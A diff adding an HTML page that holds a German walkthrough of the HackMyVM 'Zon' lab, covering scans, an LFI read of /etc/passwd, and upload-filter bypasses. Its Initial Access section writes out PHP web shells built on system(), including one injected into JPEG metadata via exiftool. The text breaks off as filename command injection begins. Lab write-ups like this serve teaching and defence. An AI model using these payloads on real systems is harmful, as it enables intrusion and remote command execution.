@@ -1,0 +1,863 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zon - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Hintergrundfarbe wird durch CSS gesteuert -->
+    <div class="header-bg">
+        <h1>Zon - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <!-- Schwierigkeitsgrad-Container mit Klasse für CSS-Styling -->
+        <div class="level-container level-medium"> <!-- Klasse angepasst -->
+            <!-- Kein Inline-Style mehr -->
+            <h2>Medium</h2> <!-- Schwierigkeitsgrad angepasst -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Kein Inline-Style mehr -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools werden hier eingefügt -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">zip</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">reportbug</div>
+                <!-- Implizite Tools: bash, mysqldump, sed, sha256sum, wall, du, vmstat, sync -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis wird hier eingefügt -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Reconnaissance Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:1c:9c:04, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.101	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+<span class="command">192.168.2.104	08:00:27:80:ff:be	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `arp-scan -l` wird das lokale Netzwerk nach aktiven Geräten durchsucht. Es wird ein Host mit der IP `192.168.2.104` identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde gefunden. Die MAC-Adresse `08:00:27:...` weist auf eine VirtualBox VM hin. Diese IP wird das Ziel für weitere Scans sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `192.168.2.104` für nachfolgende Scans. Füge einen Hostnamen in `/etc/hosts` hinzu, falls einer bekannt wird.
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um unautorisierte Scans zu erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+
+                <span class="command">192.168.2.104   zon.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/hosts` auf dem Angreifer-System wird bearbeitet, um der IP `192.168.2.104` den Hostnamen `zon.hmv` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger vorbereitender Schritt, um sicherzustellen, dass Webdienste korrekt angesprochen werden können, insbesondere wenn Virtual Hosting verwendet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Pflegen Sie die Hosts-Datei konsequent mit bekannten Hostnamen.
+<br><strong>Empfehlung (Admin):</strong> Keine direkte serverseitige Maßnahme.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.104 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 11:53 CET
+Nmap scan report for zon.hmv (192.168.2.104)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)</span>
+|_  <span class="command">256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: zon
+MAC Address: 08:00:27:80:FF:BE (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.5 (96%), Linux 5.0 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.3 - 5.4 (94%), Linux 5.4 (94%), Linux 3.4 - 3.10 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms zon.hmv (192.168.2.104)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sV -A -O -T5 -p-`) auf `zon.hmv` wird durchgeführt. Es werden zwei offene Ports gefunden:
+*   **22/tcp (SSH):** OpenSSH 9.2p1 auf Debian.
+*   **80/tcp (HTTP):** Apache httpd 2.4.57 auf Debian. Der Seitentitel ist "zon".
+Es werden keine SMB-Ports (139/445) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche beschränkt sich auf SSH und HTTP. Die Versionen der Dienste sind relativ aktuell. Der Webserver auf Port 80 ist der primäre Ansatzpunkt für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 gründlich (Verzeichnis-Bruteforce, Schwachstellenscans). Versuche SSH-Logins nur, wenn gültige Benutzernamen und Passwörter gefunden werden.
+<br><strong>Empfehlung (Admin):</strong> Halten Sie OpenSSH und Apache aktuell. Konfigurieren Sie beide Dienste sicher (SSH-Keys, HTTP-Sicherheitsheader, etc.).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.104 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wiederholung des Nmap-Scans mit `grep open`, um nur die offenen Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die beiden offenen Ports (22 und 80) für eine schnelle Übersicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester & Admin):</strong> Keine neuen Empfehlungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.104</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.104
++ Target Hostname:    192.168.2.104
++ Target Port:        80
++ Start Time:         2024-01-23 11:50:52 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: <span class="password">Web Server returns a valid response with junk HTTP methods</span> which may cause false positives.
++ /css/: <span class="command">Directory indexing found.</span>
++ /css/: This might be interesting.
++ /images/: <span class="command">Directory indexing found.</span>
++ 8103 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2024-01-23 11:51:09 (GMT1) (17 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto wird verwendet, um den Webserver zu scannen. Ergebnisse:
+*   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+*   Der Server antwortet auf ungültige HTTP-Methoden.
+*   Verzeichnisauflistung (Directory Indexing) ist für `/css/` und `/images/` aktiviert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die fehlenden Header sind geringfügige Probleme. Die aktivierte Verzeichnisauflistung kann potenziell interessante Dateien oder Strukturen preisgeben, auch wenn es hier nur Standardverzeichnisse betrifft. Die Reaktion auf Junk-Methoden ist ungewöhnlich, aber wahrscheinlich nicht direkt ausnutzbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Durchsuchen Sie die Verzeichnisse `/css/` und `/images/` manuell nach interessanten Dateien. Führen Sie weitere Web-Enumeration mit Tools wie Gobuster durch.
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Deaktivieren Sie die Verzeichnisauflistung in der Apache-Konfiguration (z.B. `Options -Indexes`). Konfigurieren Sie den Server so, dass er nur auf gültige HTTP-Methoden antwortet.</p>
+            <!-- Reconnaissance Inhalt endet hier -->
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Web Enumeration Inhalt beginnt hier -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://zon.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://zon.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] Expanded:                true
+[+] Extensions:              [...]
+[+] User Agent:              gobuster/3.6
+[+] Skip TLS verification:   true
+[+] No error logging:        true
+[+] Timeout:                 10s
+===============================================================
+2024/01/23 11:55:12 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://zon.hmv/images</span>               (Status: 301) [Size: 303] [--> http://zon.hmv/images/]
+<span class="command">http://zon.hmv/index.php</span>            (Status: 200) [Size: 29170]
+<span class="command">http://zon.hmv/contact.php</span>          (Status: 200) [Size: 11753]
+<span class="command">http://zon.hmv/about.php</span>            (Status: 200) [Size: 10538]
+<span class="command">http://zon.hmv/blog.php</span>             (Status: 200) [Size: 12490]
+<span class="command">http://zon.hmv/uploads</span>              (Status: 301) [Size: 304] [--> http://zon.hmv/uploads/]
+<span class="command">http://zon.hmv/upload.php</span>           (Status: 500) [Size: 0]
+<span class="command">http://zon.hmv/service.php</span>          (Status: 200) [Size: 12239]
+<span class="command">http://zon.hmv/report.php</span>           (Status: 200) [Size: 13]
+<span class="command">http://zon.hmv/icon</span>                 (Status: 301) [Size: 301] [--> http://zon.hmv/icon/]
+<span class="command">http://zon.hmv/css</span>                  (Status: 301) [Size: 300] [--> http://zon.hmv/css/]
+<span class="command">http://zon.hmv/js</span>                   (Status: 301) [Size: 299] [--> http://zon.hmv/js/]
+<span class="command">http://zon.hmv/fonts</span>                (Status: 301) [Size: 302] [--> http://zon.hmv/fonts/]
+<span class="command">http://zon.hmv/choose.php</span>           (Status: 200) [Size: 1908]
+<span class="command">http://zon.hmv/testimonial.php</span>      (Status: 200) [Size: 17014]
+
+===============================================================
+2024/01/23 12:01:05 Finished
+===============================================================
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan wird mit einer umfangreichen Liste von Erweiterungen und einer gängigen Wortliste durchgeführt. Gefunden werden diverse PHP-Seiten (`index.php`, `contact.php`, `about.php`, `blog.php`, `upload.php`, `service.php`, `report.php`, `choose.php`, `testimonial.php`) sowie Standardverzeichnisse (`images`, `css`, `js`, `fonts`, `icon`) und ein potenziell interessantes Verzeichnis `/uploads/`. Die Datei `upload.php` gibt einen Statuscode 500 (Internal Server Error) zurück, was auf einen Fehler oder eine unvollständige Implementierung hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Seite `upload.php` und das Verzeichnis `/uploads/` sind die vielversprechendsten Funde. Die 500er-Fehlermeldung bei direktem Aufruf von `upload.php` deutet darauf hin, dass möglicherweise Parameter fehlen oder eine bestimmte Methode (z.B. POST) erwartet wird. Das `/uploads/`-Verzeichnis könnte Aufschluss darüber geben, wo hochgeladene Dateien landen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `upload.php` genauer: Versuchen Sie POST-Requests mit Datei-Uploads, analysieren Sie den Quellcode (falls zugänglich) oder versuchen Sie, Parameter zu erraten/fuzzen. Prüfen Sie, ob das `/uploads/`-Verzeichnis direkt zugänglich ist und ob dort bereits Dateien liegen.
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Upload-Skripte robust implementiert sind und Fehler korrekt behandeln, ohne sensible Informationen preiszugeben. Beschränken Sie den Zugriff auf Upload-Verzeichnisse und verhindern Sie das Auflisten von Verzeichnisinhalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://zon.hmv" -H "Host: FUZZ.zon.hmv" --hc "404" --hh 29169</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://zon.hmv/
+Total requests: 114442
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000009533:   400        10 L     35 W       302 Ch      "#www"</span>
+<span class="password">000010582:   400        10 L     35 W       302 Ch      "#mail"</span>
+<span class="password">000047707:   400        10 L     35 W       302 Ch      "#smtp"</span>
+<span class="password">000103136:   400        10 L     35 W       302 Ch      "#pop3"</span>
+
+Total time: 0
+Processed Requests: 114442
+Filtered Requests: 114438
+Requests/sec.: 0
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, Subdomains mittels `wfuzz` zu finden. Dabei wird der `Host`-Header manipuliert (`-H "Host: FUZZ.zon.hmv"`), wobei `FUZZ` durch Einträge aus einer Subdomain-Wortliste ersetzt wird. Antworten mit Status 404 oder einer Chars-Anzahl von 29169 (vermutlich die Größe der Standardseite) werden ignoriert (`--hc 404 --hh 29169`). Die einzigen angezeigten Ergebnisse haben den Status 400 (Bad Request) und Payloads, die mit `#` beginnen (`#www`, `#mail`, etc.), was wahrscheinlich ungültige Einträge in der Wortliste oder ein Interpretationsfehler sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Subdomain-Bruteforce-Versuch war erfolglos bzw. lieferte keine verwertbaren Ergebnisse. Die 400er-Fehler deuten darauf hin, dass die generierten Host-Header vom Server nicht akzeptiert wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die verwendete Wortliste auf fehlerhafte Einträge. Versuchen Sie andere Methoden zur Subdomain-Enumeration (z.B. OSINT, Zertifikatstransparenz-Logs).
+<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass er auf ungültige Host-Header mit einer eindeutigen Fehlermeldung reagiert, aber keine internen Details preisgibt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl gezeigt, nur die Beobachtung -->
+                    <pre>
+http://zon.hmv/upload.php
+
+
+GET   http://zon.hmv/upload.php
+Status 500 Internal Server Error
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erneuter Hinweis darauf, dass ein einfacher GET-Request an `http://zon.hmv/upload.php` einen 500 Internal Server Error verursacht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Ergebnis des Gobuster-Scans. Die Seite benötigt wahrscheinlich Parameter oder eine andere HTTP-Methode (POST).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Seite `upload.php` weiter, z.B. durch Parameter-Fuzzing oder Untersuchung des Quellcodes (falls möglich).
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie den Serverfehler und implementieren Sie eine aussagekräftigere (aber nicht zu detaillierte) Fehlermeldung oder leiten Sie den Benutzer um.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://zon.hmv/upload.php?FUZZ=id" --hc 404 --hh 0</span></div>
+                     <pre>
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://zon.hmv/upload.php?FUZZ=id
+Total requests: 220558
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 220558
+Filtered Requests: 220558
+Requests/sec.: 0
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, GET-Parameter für die Seite `upload.php` mittels `wfuzz` zu finden. Der Platzhalter `FUZZ` in der URL wird durch Einträge aus einer Wortliste ersetzt. Der Wert des Parameters wird testweise auf `id` gesetzt. Antworten mit Status 404 oder 0 Chars werden ignoriert (`--hc 404 --hh 0`). Es werden keine Ergebnisse gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische Fuzzing-Versuch nach GET-Parametern für `upload.php` war erfolglos.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie POST-Parameter zu fuzzen oder andere Fuzzing-Techniken. Analysieren Sie den Client-seitigen Code (JavaScript), falls vorhanden, der mit `upload.php` interagiert, um Parameter-Namen zu finden.
+<br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl gezeigt, nur die Beobachtung -->
+                     <pre>
+http://zon.hmv/upload.php?file=file:///etc/passwd
+
+....
+...
+..
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein Versuch dokumentiert, eine Local File Inclusion (LFI)-Schwachstelle über den GET-Parameter `file` auf `upload.php` auszunutzen. Der Payload `file:///etc/passwd` versucht, die System-Passwortdatei über das `file://`-Protokoll einzubinden. Die Ausgabe (`.... ... ..`) deutet darauf hin, dass dieser Versuch möglicherweise erfolgreich war und der Inhalt von `/etc/passwd` (oder ein Teil davon) angezeigt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein signifikanter Fund! Die Anwendung scheint anfällig für LFI über den `file`-Parameter zu sein. Dies ermöglicht das Lesen beliebiger Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Zugriff hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI, um wichtige Konfigurationsdateien (z.B. `/etc/apache2/apache2.conf`, `/var/www/html/...`), Quellcode der Anwendung (`upload.php`, `index.php`, etc.) oder andere sensible Dateien (Logdateien, SSH-Keys, falls Berechtigungen es zulassen) zu lesen. Versuchen Sie ggf. auch RFI (Remote File Inclusion) oder die Verwendung von PHP-Wrappern (`php://filter`, `php://input`).
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle dringend! Validieren und sanitisieren Sie den `file`-Parameter. Verwenden Sie keine Benutzereingaben direkt in Dateipfadoperationen (`include`, `require`, `file_get_contents`). Beschränken Sie die Berechtigungen des Webserver-Benutzers.</p>
+            <!-- Web Enumeration Inhalt endet hier -->
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Initial Access Inhalt beginnt hier -->
+            <p class="analysis"><strong>Strategie: Ausnutzung der Upload-Funktion (Experimente)</strong></p>
+            <p class="analysis">Obwohl LFI gefunden wurde, wird im Folgenden versucht, die Upload-Funktion für Remote Code Execution (RCE) auszunutzen. Dies beinhaltet mehrere Versuche, die Filter der Upload-Funktion zu umgehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">echo '<!-- PHP Tags entfernt --> echo system($GET["cmd"]); ' > cmd.php</span></div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine einfache PHP-Web-Shell wird erstellt, die den Wert des GET-Parameters `cmd` als Systembefehl ausführt. Der Code wird in die Datei `cmd.php` geschrieben. (PHP-Tags entfernt).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung des Payloads für den Upload.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmd.zip cmd.php</span></div>
+                     <pre>
+  adding: cmd.php (stored 0%)
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die erstellte `cmd.php` wird in eine ZIP-Datei namens `cmd.zip` gepackt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Upload-Funktion erwartet anscheinend eine ZIP-Datei.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+http://zon.hmv/upload.php
+<span class="password">File cmd.zip has been uploaded.Archive contains non-JPEG files. It will be deleted.</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die `cmd.zip` wird über die Webseite (`upload.php`) hochgeladen. Die Anwendung meldet zwar Erfolg beim Upload, gibt aber an, dass das Archiv "non-JPEG files" enthält und gelöscht wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung prüft den Inhalt der ZIP-Datei und erlaubt anscheinend nur JPEG-Dateien. Der direkte Upload der PHP-Shell schlägt fehl.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">mv cmd.php cmd.php.jpeg</span></div>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmd.zip cmd.php.jpeg</span></div>
+                     <pre>
+  adding: cmd.php.jpeg (stored 0%)
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die PHP-Shell wird in `cmd.php.jpeg` umbenannt, um eine JPEG-Endung vorzutäuschen, und erneut gezippt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Versuch, den Filter durch Umbenennung der Datei *innerhalb* des ZIP-Archivs zu umgehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://zon.hmv/upload.php
+<span class="password">File cmdw.zip has been uploaded.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Upload der ZIP-Datei mit der umbenannten `cmd.php.jpeg` scheint erfolgreich zu sein (keine Fehlermeldung bezüglich non-JPEG). *Anmerkung: Der Dateiname `cmdw.zip` im Text ist wahrscheinlich ein Tippfehler und sollte `cmd.zip` sein.*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Filter scheint nur auf die Dateiendung zu prüfen. Die PHP-Datei ist nun wahrscheinlich auf dem Server, aber ob sie als PHP ausgeführt wird, ist fraglich.</p>
+
+             <p class="analysis"><strong>Strategie: Ausnutzung der Upload-Funktion (Exiftool-Payloads)</strong></p>
+             <p class="analysis">Da der vorherige Versuch mit der umbenannten Datei möglicherweise nicht zur Ausführung führt, wird nun versucht, PHP-Code in die Metadaten einer echten JPEG-Datei einzuschleusen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">exiftool -DocumentName='<!-- PHP Tags entfernt --> if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd=$_REQUEST['cmd']; system($cmd ); echo "</pre>"; die; } ' test.jpeg</span></div>
+                     <pre>
+    1 image files updated
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit `exiftool` wird versucht, PHP-Code in das `DocumentName`-Metadatenfeld einer Datei `test.jpeg` zu schreiben. Der Code ist eine robustere Web-Shell. (PHP-Tags entfernt)</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Experimenteller Versuch, Code in Metadaten zu verstecken. Erfolg hängt davon ab, ob die Anwendung diese Metadaten ausliest und unsicher verwendet oder ob die Datei später so behandelt wird, dass der Code ausgeführt wird (unwahrscheinlich in diesem Feld).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Diverse mv, zip Befehle -->
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">mv test.jpeg ben.jpeg</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmdtest.zip ben.jpeg</span></div>
+                      <pre>adding: ben.jpeg (deflated 1%)</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmdtest.zip ben.jpeg</span></div>
+                      <pre>adding: ben.jpeg (deflated 1%)</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">mv ben.jpeg ben.php.jpeg</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmdtest.zip ben.php.jpeg</span></div>
+                      <pre>adding: ben.php.jpeg (deflated 1%)</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">exiftool -DocumentName='<!-- PHP Tags entfernt --> if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd=$_REQUEST['cmd']; system($cmd ); echo "</pre>"; die; } ' ben.php.jpeg</span></div>
+                      <pre>1 image files updated</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip cmdtestdocument.zip ben.php.jpeg</span></div>
+                      <pre>adding: ben.php.jpeg (deflated 1%)</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine Serie von Umbenennungen, ZIP-Operationen und erneuten Exiftool-Injektionen. Es wird experimentiert, ob das Umbenennen vor/nach der Injektion oder das Zippen einen Unterschied macht. Die Datei `ben.php.jpeg` (eine JPEG-Datei mit PHP-Code im DocumentName-Metadatenfeld und einer `.php.jpeg`-Endung) wird in `cmdtestdocument.zip` verpackt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Versuche zeigen die Hartnäckigkeit bei der Suche nach einer Umgehung der Filter. Es ist jedoch unwahrscheinlich, dass Code im `DocumentName`-Feld ausgeführt wird.</p>
+
+             <p class="analysis"><strong>Strategie: Ausnutzung der Upload-Funktion (Filename Command Injection)</strong></p>
+             <p class="analysis">Nachdem die bisherigen Versuche, Code direkt auszuführen, nicht zum Ziel führten (oder zumindest nicht dokumentiert sind), wird eine andere Technik angewendet: Command Injection über den Dateinamen beim Entpacken auf dem Server.</p>
+
+            <div class="code-block">
